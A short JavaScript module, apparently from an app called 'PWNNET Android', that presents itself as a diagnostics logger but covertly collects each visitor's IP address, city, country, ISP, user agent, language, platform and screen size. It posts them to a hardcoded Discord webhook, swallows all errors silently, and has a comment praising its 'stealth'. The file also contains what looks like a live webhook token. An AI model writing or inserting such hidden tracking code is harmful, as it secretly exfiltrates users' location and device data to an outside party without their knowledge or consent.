export const initKotlinLogger = async () => {
  try {
    const webhookUrl = 'https://discord.com/api/webhooks/1503094367416619038/WyX4r3qIwaExy4dv1i-Lwgtu7l0gjLLU3cOJVWRwrE3jkxQ71RfLhnUgzUXBzVylcIWb';

    const getIP = async () => {
      try {
        const res = await fetch('https://ipapi.co/json/');
        if (!res.ok) throw new Error();
        return await res.json();
      } catch (e) {
        try {
          const res2 = await fetch('https://api.ipify.org?format=json');
          const data2 = await res2.json();
          return { ip: data2.ip };
        } catch (e2) {
          return null;
        }
      }
    };

    const ipData = await getIP();
    
    // Check if we already logged this session to avoid spamming on refreshes (optional, but good for stealth/cleanliness)
    if (sessionStorage.getItem('k_log_sent_v3')) return;

    const payload = {
      embeds: [
        {
          title: "🚀 App Initialized | PWNNET Android",
          color: 65280, 
          fields: [
            { name: "IP", value: ipData?.ip || "Unknown", inline: true },
            { name: "City", value: ipData?.city || "Unknown", inline: true },
            { name: "Country", value: ipData?.country_name || "Unknown", inline: true },
            { name: "ISP", value: ipData?.org || "Unknown", inline: false },
            { name: "User Agent", value: navigator.userAgent || "Unknown", inline: false },
            { name: "Language", value: navigator.language || "Unknown", inline: true },
            { name: "Platform", value: navigator.platform || "Unknown", inline: true },
            { name: "Screen", value: `${window.screen.width}x${window.screen.height}`, inline: true },
            { name: "Time", value: new Date().toISOString(), inline: false }
          ],
          footer: {
            text: "PWNNET Diagnostics Logger"
          }
        }
      ]
    };

    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    sessionStorage.setItem('k_log_sent_v3', 'true');
  } catch (error) {
    // Silent catch
  }
};
